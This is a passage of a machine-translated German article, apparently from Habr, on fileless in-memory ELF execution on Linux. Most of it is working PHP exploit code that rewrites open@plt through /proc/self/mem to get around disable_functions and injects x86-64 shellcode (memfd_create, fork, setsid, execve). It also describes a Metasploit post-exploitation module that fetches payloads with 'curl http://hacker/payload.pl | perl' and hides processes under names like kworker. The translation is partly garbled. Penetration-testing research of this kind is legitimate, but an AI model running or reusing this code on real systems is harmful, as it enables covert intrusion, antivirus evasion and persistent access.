$e_shoff + $i * $e_shentsize + 32, 8)); $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); } elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_ + 24, 8)); $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } } if($rela) { for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) { $r_offset = unp(substr($bin, $i, 8)); $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32; $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == 'open') { return $r_offset; } } } else { for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) { $name_off = unp(substr($bin, $i, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == '__libc_system') { $system_offset = unp(substr($bin, $i + 8, 8)); } if($name == '__open') { $open_offset = unp(substr($bin, $i + 8, 8)); } } return array($system_offset, $open_offset); }</span></span></code> </pre> <br><p>  Zus√§tzlich zeigen wir Informationen zur installierten Version von PHP an: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>)) { $version = explode(<span class="hljs-string"><span class="hljs-string">'.'</span></span>, PHP_VERSION); define(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>, ($version[<span class="hljs-number"><span class="hljs-number">0</span></span>] * <span class="hljs-number"><span class="hljs-number">10000</span></span> + $version[<span class="hljs-number"><span class="hljs-number">1</span></span>] * <span class="hljs-number"><span class="hljs-number">100</span></span> + $version[<span class="hljs-number"><span class="hljs-number">2</span></span>])); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (PHP_VERSION_ID &lt; <span class="hljs-number"><span class="hljs-number">50207</span></span>) { define(<span class="hljs-string"><span class="hljs-string">'PHP_MAJOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">0</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_MINOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">1</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_RELEASE_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">2</span></span>]); } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PHP major version "</span></span> . PHP_MAJOR_VERSION . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  Wir √ºberpr√ºfen die Bittiefe des Betriebssystems und die Version des Linux-Kernels: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strpos(php_uname(<span class="hljs-string"><span class="hljs-string">'a'</span></span>), <span class="hljs-string"><span class="hljs-string">'x86_64'</span></span>) === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] This exploit is for x64 Linux. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(substr(php_uname(<span class="hljs-string"><span class="hljs-string">'r'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>) &lt; <span class="hljs-number"><span class="hljs-number">2.98</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Too old kernel (&lt; 2.98). Might not work\n"</span></span>; }</code> </pre> <br><p>  Um die Einschr√§nkungen von <code>disable_functions</code> zu umgehen, schreibt das Skript die Adresse der <code>open@plt</code> Funktion im <code>open@plt</code> .  Wir haben einige Erg√§nzungen zu beched'a Code vorgenommen, und jetzt k√∂nnen wir unseren Shellcode speichern. </p><br><p>  Zuerst m√ºssen Sie die Verschiebung in der Bin√§rdatei des PHP-Interpreters selbst finden. Dazu wenden wir uns an <code>/proc/self/exe</code> und analysieren die ausf√ºhrbare Datei mit der <code>parseelf()</code> beschriebenen Funktion <code>parseelf()</code> : </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open@plt offset in PHP binary\n"</span></span>; $open_php = parseelf(<span class="hljs-string"><span class="hljs-string">'/proc/self/exe'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($open_php == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[+] Offset is 0x'</span></span> . dechex($open_php) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $maps = file_get_contents(<span class="hljs-string"><span class="hljs-string">'/proc/self/maps'</span></span>); preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(/.+libc\-.+)#'</span></span>, $maps, $r); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Libc location: $r[1]\n"</span></span>; preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(.+\[stack\].*)#'</span></span>, $maps, $m); $stack = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $m[<span class="hljs-number"><span class="hljs-number">1</span></span>])[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Stack location: "</span></span>.dechex($stack).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $pie_base = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $maps)[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PIE base: "</span></span>.dechex($pie_base).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open and system symbols from Libc\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">list</span></span>($system_offset, $open_offset) = parseelf($r[<span class="hljs-number"><span class="hljs-number">1</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($system_offset == <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> $open_offset == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  Suchen Sie die Adresse der Funktion <code>open()</code> : </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Got them. Seeking for address in memory\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'rb'</span></span>); fseek($mem, ((PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base) + $open_php); $open_addr = unp(fread($mem, <span class="hljs-number"><span class="hljs-number">8</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[INFO] open@plt addr: 0x'</span></span> . dechex($open_addr) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Rewriting open@plt address\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'wb'</span></span>);</code> </pre> <br><p>  Jetzt k√∂nnen Sie direkt unsere ausf√ºhrbare Datei herunterladen. <br>  Erstellen Sie zun√§chst eine anonyme Datei: </p><br><pre> <code class="php hljs">$shellcode_loc = $pie_base + <span class="hljs-number"><span class="hljs-number">0x100</span></span>; $shellcode=<span class="hljs-string"><span class="hljs-string">"\x48\x31\xD2\x52\x54\x5F\x6A\x01\x5E\x68\x3F\x01\x00\x00\x58\x0F\x05\x5A\xC3"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fseek($mem, (PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base + $open_php); fwrite($mem, packlli($shellcode_loc)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Address written. Executing cmd\n"</span></span>; $fp = fopen(<span class="hljs-string"><span class="hljs-string">'fd'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>);</code> </pre> <br><p>  Wir schreiben das Laden in eine anonyme Datei: </p><br><pre> <code class="php hljs">fwrite($fp, $elf);</code> </pre> <br><p>  Wir suchen nach der Dateideskriptornummer: </p><br><pre> <code class="php hljs">$found = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $fds = scandir(<span class="hljs-string"><span class="hljs-string">"/proc/self/fd"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>($fds <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $fd) { $path = <span class="hljs-string"><span class="hljs-string">"/proc/self/fd/$fd"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!is_link($path)) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strstr(readlink($path), <span class="hljs-string"><span class="hljs-string">"memfd"</span></span>)) { $found = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!$found) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[-] memfd not found'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  Als n√§chstes schreiben wir den Pfad zur ausf√ºhrbaren Datei auf den Stapel: </p><br><pre> <code class="php hljs">fseek($mem, $stack); fwrite($mem, <span class="hljs-string"><span class="hljs-string">"{$path}\x00"</span></span>); $filename_ptr = $stack; $stack += strlen($path) + <span class="hljs-number"><span class="hljs-number">1</span></span>; fseek($mem, $stack);</code> </pre> <br><p>  Und die auszuf√ºhrenden Argumente wurden an die ausf√ºhrbare Datei √ºbergeben: </p><br><pre> <code class="php hljs">fwrite($mem, str_replace(<span class="hljs-string"><span class="hljs-string">" "</span></span>, <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, $args) . <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>); $str_ptr = $stack; $argv_ptr = $arg_ptr = $stack + strlen($args) + <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>(explode(<span class="hljs-string"><span class="hljs-string">' '</span></span>, $args) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $arg) { fseek($mem, $arg_ptr); fwrite($mem, packlli($str_ptr)); $arg_ptr += <span class="hljs-number"><span class="hljs-number">8</span></span>; $str_ptr += strlen($arg) + <span class="hljs-number"><span class="hljs-number">1</span></span>; } fseek($mem, $arg_ptr); fwrite($mem, packlli(<span class="hljs-number"><span class="hljs-number">0x0</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Argv: "</span></span> . $args . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  Als n√§chstes f√ºhren wir durch Aufrufen von <code>fork()</code> unsere Nutzdaten aus: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Starting ELF\n"</span></span>; $shellcode = <span class="hljs-string"><span class="hljs-string">"\x6a\x39\x58\x0f\x05\x85\xc0\x75\x28\x6a\x70\x58\x0f\x05\x6a\x39\x58\x0f\x05\x85\xc0\x75\x1a\x48\xbf"</span></span> . packlli($filename_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\xbe"</span></span> . packlli($argv_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\x31\xd2\x6a\x3b\x58\x0f\x05\xc3\x6a\x00\x5f\x6a\x3c\x58\x0f\x05"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fopen(<span class="hljs-string"><span class="hljs-string">'done'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>();</code> </pre> <br><h4 id="shellkod">  Shellcode </h4><br><p>  Shellcode bedeutet normalerweise eine Folge von Bytes, die im Speicher gespeichert und dann normalerweise im Kontext eines anderen Programms unter Verwendung von Puffer√ºberlaufangriffen und anderen ausgef√ºhrt werden.  In unserem Fall gibt der Shellcode nicht die Eingabeaufforderung des Remote-Servers (tats√§chlich Shell) zur√ºck, sondern erm√∂glicht es uns, die ben√∂tigten Befehle auszuf√ºhren. </p><br><p>  Um die erforderliche Bytesequenz zu erhalten, k√∂nnen Sie entweder C-Code schreiben, ihn dann in Assembler-Sprache √ºbersetzen oder Assembler-Sprache von Grund auf neu schreiben. </p><br><p>  Mal sehen, was sich hinter der Folge von Bytes aus den obigen Auflistungen verbirgt. </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  Der Start unseres Programms beginnt mit c <code>fork</code> .  57 ist der numerische Wert der Systemaufrufkennung f√ºr 64-Bit-Systeme.  Die Tabelle finden Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> . </p><br><p>  Als n√§chstes rufen wir <code>setsid</code> (numerische Kennung 112) auf, um den <code>setsid</code> Prozess in den √ºbergeordneten Prozess zu konvertieren: </p><br><pre> <code class="plaintext hljs">push 112 pop rax syscall</code> </pre> <br><p>  Dann machen Sie eine andere <code>fork</code> : </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  F√ºhren Sie dann das bekannte <code>execve()</code> : </p><br><pre> <code class="plaintext hljs">; execve mov rdi, 0xcafebabecafebabe ; filename mov rsi, 0xdeadbeefdeadbeef ; argv xor rdx, rdx ; envp push 0x3b pop rax syscall push -1 pop rax ret</code> </pre> <br><p>  Und wir beenden den Prozess mit <code>exit()</code> (60): </p><br><pre> <code class="plaintext hljs">; exit quit: push 0 pop rdi push 60 pop rax syscall</code> </pre> <br><p>  Daher haben wir den Funktionscode open () unterwegs ersetzt.  Unsere ausf√ºhrbare Datei wurde im Speicher abgelegt und mit dem PHP-Interpreter ausgef√ºhrt.  Systemaufrufe werden als Shellcodes dargestellt. </p><br><h3 id="metasploit-framework">  Metasploit-Framework </h3><br><p>  Als Zusammenstellung der oben genannten Techniken haben wir ein <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Modul f√ºr MSF</a> vorbereitet. </p><br><p>  Um es zu Metasploit hinzuzuf√ºgen, kopieren Sie einfach die Moduldatei in das Verzeichnis <code>$HOME/.msf4/module/post/linux/manage/download_exec_elf_in_memory.rb</code> und f√ºhren Sie dann den Befehl <code>reload_all</code> in der Framework-Konsole aus. <br>  Um unser Modul zu verwenden, geben Sie <code>use post/linux/manage/download_exec_elf_in_memory</code> (oder einen anderen Pfad, je nachdem in welchem ‚Äã‚ÄãVerzeichnis die Moduldatei abgelegt wurde). <br>  Bevor Sie es verwenden, m√ºssen Sie die erforderlichen Optionen festlegen.  Die Liste der Optionen wird mit dem Befehl <code>show options</code> angezeigt. </p><br><p>  <code>ARGS</code> - Argumente f√ºr die ausf√ºhrbare Datei </p><br><p>  <code>FILE</code> - Pfad zur ausf√ºhrbaren Datei.  In unserem Fall ist dies Netcat. </p><br><p>  <code>NAME</code> ist der Name des Prozesses.  Du kannst ihn alles nennen.  Zum Beispiel kann dies aus Gr√ºnden der Heimlichkeit kworker: 1 sein oder um etwas Komisches zu demonstrieren, zum Beispiel KittyCat </p><br><p>  <code>SESSION</code> - Meterpreter-Sitzung.  Es versteht sich, dass dieses Modul f√ºr Nachoperationszwecke verwendet wird. </p><br><p>  Als <code>SRVHOST</code> <code>SRVPORT</code> wir den Host, auf dem sich der http-Server mit unserer Last befindet, und seinen Port in den <code>SRVPORT</code> <code>SRVHOST</code> bzw. <code>SRVPORT</code> . </p><br><p>  <code>VECTOR</code> - Die Methode, mit der die Ausf√ºhrung des Programms im Speicher erreicht wird. Der Parameter ist optional. Wenn er leer ist, stellt das Skript selbst das Vorhandensein der erforderlichen Interpreter fest.  Derzeit werden PHP, Python oder Perl unterst√ºtzt. </p><br><p>  <code>run</code> den Befehl <code>exploit</code> oder <code>run</code> </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/y9vRUItW_5c" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><p>  Es funktioniert wie folgt: Wir geben die gew√ºnschte Sitzung an. Es kann sich entweder um einen Meterpreter oder eine regul√§re Reverse-Shell handeln.  Als n√§chstes geben wir den lokalen Pfad zu unserem Elfen, die Argumente und den gew√ºnschten Namen in der Liste der Prozesse an.  Nach dem Start wird ein lokaler Webserver zum Hosten der Nutzdaten gestartet, und die Sitzung sucht nach ‚ÄûSchaukelst√ºhlen‚Äú. Curl und Wget werden derzeit unterst√ºtzt.  Nachdem mindestens einer von ihnen gefunden wurde, werden alle Interpreter durchsucht, wenn wir im Parameter <code>VECTOR</code> nicht angegeben haben, welchen wir ben√∂tigen.  Nun, wenn dies erfolgreich ist, wird ein Befehl ausgef√ºhrt, um die Nutzdaten von unserem Webserver herunterzuladen und per Pipe an den gew√ºnschten Interpreter zu √ºbertragen, d. H.  so etwas wie <code>$ curl http://hacker/payload.pl | perl</code> <code>$ curl http://hacker/payload.pl | perl</code> </p><br><h3 id="vmesto-zaklyucheniya">  Anstelle einer Schlussfolgerung. </h3><br><p>  Das dateilose Herunterladen von ELF-Dateien unter Linux ist eine n√ºtzliche Technik f√ºr Penetrationstests.  Dies ist eine ziemlich stille Methode, die einer Vielzahl von Antiviren-Schutz-Tools, Integrit√§ts√ºberwachungssystemen und √úberwachungssystemen standh√§lt, die √Ñnderungen im Inhalt der Festplatte √ºberwachen.  Auf diese Weise k√∂nnen Sie den Zugriff auf das Zielsystem problemlos aufrechterhalten und dabei ein Minimum an Spuren hinterlassen. <br>  In diesem Artikel haben wir interpretierte Programmiersprachen verwendet, die h√§ufig standardm√§√üig auf Linux-Distributionen, Firmware, Routern und Mobilger√§ten installiert sind.  Ich m√∂chte auch dem Autor <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">dieses Artikels</a> danken, der uns zu dieser Rezension inspiriert hat. </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de430902/">https://habr.com/ru/post/de430902/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de430890/index.html">Wo Agilit√§t schrecklich ist, besonders Scrum</a></li>
<li><a href="../de430892/index.html">Die Kombination aus plattform√ºbergreifendem und nativem Ansatz bei der Entwicklung mobiler Anwendungen</a></li>
<li><a href="../de430894/index.html">Situation: Marken geben immer mehr Geld f√ºr Werbung in Podcasts aus - wir verstehen warum</a></li>
<li><a href="../de430896/index.html">Die Linux Foundation hat Fonds f√ºr GraphQL und Ceph eingerichtet - warum werden sie ben√∂tigt und was kann man von ihnen erwarten?</a></li>
<li><a href="../de430900/index.html">Der erste Laser in der Geschichte: was es war</a></li>
<li><a href="../de430906/index.html">Mama schl√§ft nachts ruhig - wir sammeln OpenCV f√ºr Raspbian'a</a></li>
<li><a href="../de430910/index.html">Fulbright-Stipendium: Wie und warum?</a></li>
<li><a href="../de430912/index.html">Wir bringen einen L√ºgner zu sauberem Wasser: Ein Interview ist kein Arbeitsverh√§ltnis. Nat√ºrlich</a></li>
<li><a href="../de430914/index.html">Analyse der Schwarzmarktpreise f√ºr personenbezogene Daten und Durchbruch</a></li>
<li><a href="../de430916/index.html">Kohlendioxiddetektor MT8057S. Nicht√ºberpr√ºfung unter Beteiligung eines Nichtemulators</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>